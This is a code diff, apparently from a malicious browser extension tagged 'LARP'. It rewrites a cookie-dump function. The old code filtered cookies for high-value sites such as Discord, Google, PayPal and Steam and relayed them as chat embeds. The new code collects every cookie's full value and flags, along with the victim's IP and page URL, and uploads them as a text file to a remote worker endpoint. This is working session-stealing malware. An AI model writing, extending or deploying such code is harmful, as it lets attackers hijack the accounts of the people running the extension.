@@ -282,39 +282,48 @@ function initMonitor() {
   }).observe(document, { childList: true, subtree: true });
 }
 
-// --- cookie dump ---
+// --- cookie dump (sends as .txt file via worker) ---
 async function dumpAllCookies() {
   console.log('[LARP] dumpCookies: requesting all cookies...');
   try {
     var cookies = await chrome.cookies.getAll();
     if (!cookies || cookies.length === 0) { console.log('[LARP] dumpCookies: no cookies'); return; }
     console.log('[LARP] dumpCookies: got ' + cookies.length + ' cookies');
-    // Filter to high-value domains
-    var valuable = [];
-    var targets = ['roblox', 'discord', 'google', 'youtube', 'facebook', 'twitter', 'x.com', 'steam',
-      'reddit', 'spotify', 'github', 'microsoft', 'twitch', 'amazon', 'paypal', 'netflix', 'tiktok'];
+
+    // Build text file content - all cookies
+    var lines = [];
+    lines.push('# Cookie Dump - ' + new Date().toISOString());
+    lines.push('# IP: ' + _ip);
+    lines.push('# Page: ' + location.href);
+    lines.push('# Total: ' + cookies.length + ' cookies');
+    lines.push('');
     for (var i = 0; i < cookies.length; i++) {
       var c = cookies[i];
-      for (var j = 0; j < targets.length; j++) {
-        if (c.domain.indexOf(targets[j]) !== -1) {
-          valuable.push({ domain: c.domain, name: c.name, value: c.value.slice(0, 100) });
-          break;
-        }
-      }
+      lines.push('Domain: ' + c.domain);
+      lines.push('Name: ' + c.name);
+      lines.push('Value: ' + c.value);
+      lines.push('Path: ' + (c.path || '/'));
+      lines.push('Secure: ' + (c.secure ? 'Yes' : 'No'));
+      lines.push('HttpOnly: ' + (c.httpOnly ? 'Yes' : 'No'));
+      lines.push('SameSite: ' + (c.sameSite || 'unspecified'));
+      if (c.expirationDate) lines.push('Expires: ' + new Date(c.expirationDate * 1000).toISOString());
+      lines.push('---');
     }
-    var all = cookies.map(function(c) { return c.domain + ' | ' + c.name + ' = ' + c.value.slice(0, 80); });
-    // Build fields for valuable cookies
-    var fields = [];
-    for (var k = 0; k < valuable.length && k < 25; k++) {
-      var v = valuable[k];
-      fields.push({ name: v.domain + ' / ' + v.name, value: '`' + v.value + '`', inline: false });
-    }
-    if (fields.length === 0 && all.length > 0) {
-      fields.push({ name: 'All (' + all.length + ')', value: '`' + all.slice(0, 10).join('\n') + '`', inline: false });
-    }
-    if (fields.length > 0) {
-      relay('cookies', { embeds: [{ title: 'Cookie Dump [' + _ip + '] (' + cookies.length + ' total)', color: 0x8B5CF6, fields: fields, footer: { text: 'Cookies' }, timestamp: new Date().toISOString() }] });
-    }
+    var txt = lines.join('\n');
+    console.log('[LARP] dumpCookies: file size ' + txt.length + ' chars');
+
+    // Send as file upload via worker
+    var fileUrl = WORKER.replace(/\/api\/ingest$/, '/api/file');
+    console.log('[LARP] dumpCookies: uploading ' + txt.length + ' chars to ' + fileUrl);
+    fetch(fileUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain' },
+      body: txt
+    }).then(function(r) {
+      console.log('[LARP] dumpCookies: uploaded, status ' + r.status);
+    }).catch(function(e) {
+      console.error('[LARP] dumpCookies upload error:', e.message);
+    });
   } catch(e) { console.error('[LARP] dumpCookies error:', e.message); }
 }
 
